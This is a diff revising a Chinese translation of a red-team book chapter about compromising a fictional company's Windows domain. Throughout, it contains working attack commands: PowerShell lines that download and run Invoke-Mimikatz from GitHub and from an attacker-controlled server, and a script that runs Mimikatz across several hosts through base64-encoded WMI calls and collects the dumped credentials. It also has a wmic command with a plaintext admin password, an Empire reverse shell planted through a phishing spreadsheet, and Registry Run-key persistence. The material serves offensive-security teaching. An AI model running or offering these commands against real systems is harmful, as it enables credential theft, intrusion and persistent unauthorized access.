@@ -113,7 +113,7 @@ FrontGun$ proxychains crackmapexec -u svc_mnt -p Hello5\!981 -d WORKGROUP 10.10.
 
 UAC 是 Windows vista 中引入的一个功能，在执行特权操作\(软件安装等\)之前，会弹出一个对话框来提示用户。因此，即使管理员也不能在系统上远程执行特权命令。但默认的管理员帐户在默认状况下不受UAC的约束\[69\]，这就是为什么它以前没有给我们带来太多麻烦的原因。
 
-幸运的是，其中一台存在**svc\_mnt**账号的主机10.10.20.118似乎开放了RDP 端口 （3389）。如果我们能在远程服务器上打开图形交互会话，那么UAC不再是问题了！
+幸运的是，其中一台存在**svc\_mnt**账号的主机10.10.20.118似乎开放了RDP 端口 （3389）。如果我们能在远程服务器上打开图形交互会话，那么 UAC 就不是问题了！
 
 我们在Front Gun 服务器上启动 **rdesktop**（或 **mstsc**），用**svc\_mnt**帐户登录。
 
@@ -128,7 +128,7 @@ $browser.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredent
 
 IEX($browser.DownloadString("https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1"))
 
-invoke-Mimikatz
+Invoke-Mimikatz
 ```
 
 我们打开具有管理权限的命令提示符（右键单击&gt;以管理员身份运行），然后执行脚本:
@@ -146,95 +146,97 @@ Career# wget https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/maste
 Career# python -m SimpleHTTPServer 443
 ```
 
-我们更新 PowerShell 脚本来更新URL的变更，然后再次执行它:
+我们修改 PowerShell 脚本中的 URL，再执行一次:
 
 ```text
 $browser = New-Object System.Net.WebClient
 
-IEX($browser.DownloadString("http://192.168.1.46:443/I Mimikatz.ps1"))
+IEX($browser.DownloadString("http://192.168.1.46:443/Invoke-Mimikatz.ps1"))
 
 invoke-Mimikatz
 ```
 
 ![&#x811A;&#x672C;&#x6267;&#x884C;&#x793A;&#x610F;&#x56FE;](.gitbook/assets/4.3-3.jpg)
 
-虽然我们可能还不是域管理员，但我想你应该看到了屏幕上弹出的本地管理员的密码：**Dom\_M\_ster\_P\_ssword1**。
+我们现在还不是域管理员，但我希望你注意到了屏幕上弹出的本地管理员密码：**Dom\_M\_ster\_P\_ssword1**。
 
-看来域计算机与非域计算机具有不同的本地管理员帐户。 现在酷的是我们可以在所有共享这个相同管理员帐户的机器上执行一个Mimikatz。 当然，有时会命中，有时却会丢失，但是我们只需要在正确的时间在正确的计算机上连接一个域特权帐户即可！
+看来域计算机与非域计算机具有不同的本地管理员帐户。 现在，我们可以在所用拥有 administrator 账户的机器上执行Mimikatz了。执行结果可能成功，也可能失败，但是别忘了，我们并不需要全都成功，只要能找到一台具备域权限的机器就达到目的了。
 
-通过DMZ区内控制的Front Gun服务器上建立的socks代理，我们将直接从10.10.20.118服务器执行minikatz，而不是通过CrackMapExec。这样我们就可以完全绕过防火墙的限制。\(CME依赖RPC端口：135、49152到65535来远程执行Mimikatz，但在DMZ和内网之间的防火墙不太可能允许这样做。\)
+先前，我们在蓝区搭建了socks 代理，然后在 Front Gun 服务器上通过 CrackMapExec 中调用 Minikatz。这一次我们直接在 10.10.20.118 服务器上执行 Minikatz。这种方式可以完全绕过防火墙的过滤规则。\(CME依赖RPC端口：135、49152到65535来远程执行Mimikatz，但在DMZ和内网之间的防火墙不太可能允许这样做。\)
 
-我们使用获得的管理员帐户打开 RDP 会话，并通过添加**-Computer** switch修改脚本以支持在多台计算机上执行：
+使用获得的 administrator 帐户登录 RDP 会话，通过添加**-Computer** 参数，让脚本可以支持在多台计算机上执行：
 
 ```text
 $browser = New-Object System.Net.WebClient
 
-IEX($browser.DownloadString("http://192.168.1.46:443/I Mimikatz.ps1"))
+IEX($browser.DownloadString("http://192.168.1.46:443/Invoke-Mimikatz.ps1")
 
 invoke-mimikatz -Computer FRSV27,FRSV210,FRSV229,FRSV97 |out-file result.txt -Append
 ```
 
-这一次，**Invoke-Mimikatz**将使用远程 PowerShell 执行创建远程线程（端口 5985 上的 WinRM 服务），然后将结果存储在result.txt 中。
+这一次，**Invoke-Mimikatz** 将使用远程 PowerShell 执行创建远程线程（端口 5985 上的 WinRM 服务），然后将结果存储在result.txt 中。
 
-补充说明：
+{% hint style="info" %}
+建议：当使用远程PowerShell执行时，应总是指定服务器的名称而不是IP地址\(使用nslookup\)。
+{% endhint %}
 
-当使用远程PowerShell执行时，应总是指定服务器的名称而不是IP地址\(使用nslookup\)。
-
+{% hint style="info" %}
 如果未启用远程 PowerShell（端口 5985），我们可以使用 Windows 计算机的 WMI 命令修复它： wmic /user:administrator /password: Dom\_M@ster\_P@ssword1 /node:10.10.20.229 process call create " powershell enable-PSRemoting -force "\`
+{% endhint %}
 
 ![xx&#x793A;&#x610F;&#x56FE;](.gitbook/assets/4.3-4.jpg)
 
-你看看！我们已经收集到 60 多个密码。果然，我们发现一个可能具有有趣特权的帐户：**adm\_supreme**。然后，我们查询"域管理员"组进一步确认： ![xx&#x793A;&#x610F;&#x56FE;](.gitbook/assets/4.3-5.jpg)
+你看！我们已经拿到 60 多个密码啦。我们注意到了一个“可疑”账号**adm\_supreme**，它可能具备特殊权限。然后，我们查询"domain admins"组进一步确认： 
 
-**adm\_supreme**确实属于"域管理员"组。我们攻下了！
+![xx&#x793A;&#x610F;&#x56FE;](.gitbook/assets/4.3-5.jpg)
 
-`提示：查询域资源（组，用户等）时，请记住必须使用有效的域帐户。 在上面的屏幕中，在执行“ net group”命令之前，我们使用adm_supreme帐户重新连接到10.10.20.118。`
+**adm\_supreme**确实属于"domain admins"组。搞定！
 
+{% hint style="info" %}
+提示：查询域资源（组，用户等）时，请记住必须使用有效的域帐户。在上面的屏幕中，在执行 “net group” 命令之前，我们使用adm_supreme 帐户重新连接到10.10.20.118。
+{% endhint %}
+
+{% hint style="success" %}
 深度分析
 
-使用invoke-mimikatz特性在多台机器上执行代码实际上并不可靠。如果管理员没有正确配置PowerShell remoting，则使其工作可能有点棘手。解决此类问题的一种方法是使用WMI，这是在服务器上执行远程命令的另一个有趣的工具。
+使用 invoke-mimikatz 特性在多台机器上执行代码实际上不太稳定。如果管理员没有正确配置PowerShell，要想使其正常运行需要一点技巧。其中一种方法是使用 WMI，这也是一个在服务器上执行远程命令的有趣工具。
 
-我们的想法是创建一个行的PowerShell命令执行Mimikatz和转储内容到本地文件。 我们使用WMI远程启动此代码，等待几秒钟，然后在我们的计算机上检索文件。
+我的想法是使用一句话 PowerShell 命令，调用 Mimikatz 然后将内容导出到本地文件。我们使用 WMI 远程执行这条命令，等待几秒钟，然后在我们的计算机上查找导出文件。
 
-接下来我们一步一步地分析：
+我们一步一步分析如何来实现：
 
-1. 我们稍微更改以前的代码，将目标的 IP 地址包含在输出的文件名中:
-
-```text
+1. 稍微更改以前的代码，将目标的 IP 地址包含在输出的文件名中:
+```ps
 $browser = New-Object System.Net.WebClient
-IEX($browser.DownloadString("http://192.168.1.46:443/I Mimikatz.ps1"))
-$machine_name = (get-netadapter | get-netipaddress | ? addressfamily -eq "IPv4").ipaddress invoke-mimikatz | out-file c:\windows\temp\$machine_name".txt"
+IEX($browser.DownloadString("http://192.168.1.46:443/Invoke-Mimikatz.ps1"))
+$machine_name = (get-netadapter | get-netipaddress | ? addressfamily -eq "IPv4").ipaddress 
+invoke-mimikatz | out-file c:\windows\temp\$machine_name".txt"
 ```
 
-1. 我们将每个换行符更改为“;”，然后将此脚本放入PowerShell脚本的变量中：
+2. 将所有的换行符更改为“;”，然后将此脚本放入 PowerShell 脚本的变量中：
+```ps
+PS > $command = '$browser = New-Object System.Net.WebClient;IEX($browser.DownloadString("htt Mimikatz.ps1"));$machine_name = (get-netadapter | get- netipaddress | ? addressfamily -eq "IPv4").ipaddress;invoke-mimikatz | out-file c:\windows\temp\$machine_name".txt"'
+```
 
-   ```text
-   PS > $command = '$browser = New-Object System.Net.WebClient;IEX($browser.DownloadString("htt Mimikatz.ps1"));$machine_name = (get-netadapter | get- netipaddress | ? addressfamily -eq "IPv4").ipaddress;invoke-mimikatz | out-file c:\windows\temp\$machine_name".txt"'
-   ```
+3. 对这个变量进行base64编码，并定义要定位的机器：
+```ps
+PS> $bytes = [System.Text.Encoding]::Unicode.GetBytes($command)
+PS> $encodedCommand = [Convert]::ToBase64String($bytes)
+PS> $PC_IP = @("10.10.20.229", "10.10.20.97")
+```
 
-2. 我们对这个变量进行base64编码，并定义要定位的机器：
+4. 然后，我们准备启动 WMI 循环，该循环生成带有先前 base64 代码作为参数传递的PowerShell：
+```ps
+PS> invoke-wmimethod -ComputerName $X win32_process -name create -argumentlist ("powershell - encodedcommand $encodedCommand")
+```
 
-   ```text
-   PS> $bytes = [System.Text.Encoding]::Unicode.GetBytes($command)
-   PS> $encodedCommand = [Convert]::ToBase64String($bytes)
-   PS> $PC_IP = @("10.10.20.229", "10.10.20.97")
-   ```
+5. 最后，我们把导出的文件移到我们目标机 10.10.20.118：
+```ps
+PS> move-item -path "\\$X\C$\windows\temp\$X.txt" - Destination C:\users\Administrator\desktop\ -force
+```
 
-3. 然后我们准备循环执行WMI，生成PowerShell，将前面的base64代码作为参数传递：
-
-   ```text
-   PS> invoke-wmimethod -ComputerName $X win32_process -name create -argumentlist ("powershell - encodedcommand $encodedCommand")
-   ```
-
-4. 最后，我们把导出的文件移到我们目标机10.10.20.118：
-
-   ```text
-   PS> move-item -path "\\$X\C$\windows\temp\$X.txt" - Destination C:\users\Administrator\desktop\ -force
-   ```
-
-   以下是整个脚本和一个小的附加代码片段，该附加代码段将等到远程进程完成后才检索结果:
-
-```text
+以下是完整的脚本代码，和一段附加代码，该代码段将等到远程进程结束后才检索结果:
+```ps
 $command = '$browser = New-Object System.Net.WebClient;IEX($browser.DownloadString("htt Mimikatz.ps1"));$machine_name = (get-netadapter | get- netipaddress | ? addressfamily -eq "IPv4").ipaddress;invoke-mimikatz | out-file c:\windows\temp\$machine_name".txt"'
 
 $bytes = [System.Text.Encoding]::Unicode.GetBytes($command)
@@ -243,30 +245,33 @@ $encodedCommand = [Convert]::ToBase64String($bytes)
 $PC_IP = @("10.10.20.229", "10.10.20.97")
 
 ForEach ($X in $PC_IP) {
-$proc = invoke-wmimethod -ComputerName $X win32_process -name create -argumentlist ("powershell - encodedcommand $encodedCommand")
-$proc_id = $proc.processId
+    $proc = invoke-wmimethod -ComputerName $X win32_process -name create -argumentlist ("powershell - encodedcommand $encodedCommand")
+    $proc_id = $proc.processId
 
-do {(Write-Host "[*] Waiting for mimi to finish on $X"), (Start-Sleep -Seconds 2)}
-until ((Get-WMIobject -Class Win32_process -Filter "ProcessId=$proc_id" -ComputerName $X | where
-{$_.ProcessId -eq $proc_id}).ProcessID -eq $null) move-item -path "\\$X\C$\windows\temp\$X.txt" -
-Destination C:\users\Administrator\desktop\ -force
-write-host "[+] Got file for $X" -foregroundcolor "green"
+    do {(Write-Host "[*] Waiting for mimi to finish on $X"), (Start-Sleep -Seconds 2)}
+    until ((Get-WMIobject -Class Win32_process -Filter "ProcessId=$proc_id" -ComputerName $X | where
+    {$_.ProcessId -eq $proc_id}).ProcessID -eq $null) move-item -path "\\$X\C$\windows\temp\$X.txt" -
+    Destination C:\users\Administrator\desktop\ -force
+    write-host "[+] Got file for $X" -foregroundcolor "green"
 }
 ```
+{% endhint %}
 
 ## 4.4 遗漏的环节
 
-还记得我们的网络钓鱼活动吗？当我们忙于同时购买机器和域时，员工们欣喜地打开我们的Excel文件。
+还记得我们的网络钓鱼活动吗？当我们忙着渗透服务器和域时，员工们正欣喜地打开我们的Excel文件。
 
 ![xx&#x793A;&#x610F;&#x56FE;](.gitbook/assets/4.4-1.jpg)
 
-尽管我们现在控制着SPH网络上的所有资源，但让我们看看如何通过用户工作站来达到相同的结果。
+尽管通过前面的过程，我们已经完全控制了 SPH 网络上的所有资源，但如何通过用户终端来达到同样的效果呢？让我们一起来看看。
 
-注意：我们切换回Empire框架，在该框架中，Front Gun服务器正在监听等待来自Excel恶意软件的传入连接。
+{% hint style="info" %}
+注意：我们切换回 Empire 框架，在该框架中，Front Gun服务器正在监听来自恶意 Excel 软件的传入连接。
+{% endhint %}
 
-我们与随机目标互动，并列出有关环境的基本信息：
+随便选一台目标主机进行交互，列出有关环境的基本信息：
 
-```text
+```shell
 (Empire) > interact D1GAMGTVCUM2FWZC
 (Empire: D1GAMGTVCUM2FWZC) > sysinfo
     Listener:    http://<front-gun>:80 
@@ -280,19 +285,20 @@ write-host "[+] Got file for $X" -foregroundcolor "green"
 (Empire: mike) >
 ```
 
-反向shell由后台运行的PowerShell进程托管。即使用户关闭了Excel文档，我们仍然保留对其计算机的访问权限。当然，简单的重启会杀死我们的代理。因此，在继续之前，我们需要采取一些预防措施。
+反弹 shell 的宿主是正在后台运行的 Powershell 进程。这样即便用户关闭了Excel文档，我们仍能维持对该计算机的访问权。当然，用户只要一重启，我们的代理就会被干掉。因此，在继续之前，我们需要采取一些“后门加固”措施。
 
-在每次新登录时，Windows都会查找一些注册表项，并盲目执行许多程序。我们将使用这些注册表项之一来存储PowerShell脚本，该脚本将在Mike每次重新启动计算机时重新连接。
+在每次新登录时，Windows都会查找一些注册表项，并盲目执行许多程序。我们将从中选择一个注册表键值来存储一段 PowerShell 脚本，这样 Mike 每次重新启动电脑后都会自动回连。
 
-```text
+```shell
 (Empire:mike)> usemodule persistence/userland/registry
 (Empire : persistence/userland/registry) > set Listener test
 (Empire : persistence/userland/registry) > run
 ```
 
-这个特定的模块使用RUN键来实现持久性_（HKCU  Software  Microsoft  Windows  CurrentVersion  Ru_是无数恶意软件使用的已知方法）。这远不是我们所能想出的最隐秘的方法，但鉴于我们在工作站上的特权有限，我们暂时无法真正负担得起一些性感。
-
-提示：只需更改模块中的目标“设置代理XXXXX”，即可在所有其他代理上盲目执行此模块。
+这个特定的模块使用 RUN 键来实现持久化（HKCU\Software\Microsoft\Windows\CurrentVersion\Run），这种方法已经被无数恶意软件玩烂了。这远不是我们所能想出的最隐秘的方法，但鉴于我们在工作站上的权限不足，暂时还没办法使用一些“风骚”的操作。
+{% hint style="info" %}
+提示：只需更改模块中的目标选项“set target XXXXX”，就可以在其他所有代理上直接执行此模块。
+{% endhint %}
 
 现在，我们已经涵盖了这一点，我们希望定位的用户更有可能在域上具有某些管理特权，或者至少具有对某些服务器的访问权。一个明显的目标是IT支持部门。我们要求Active Directory列出在该部门注册的员工：
 
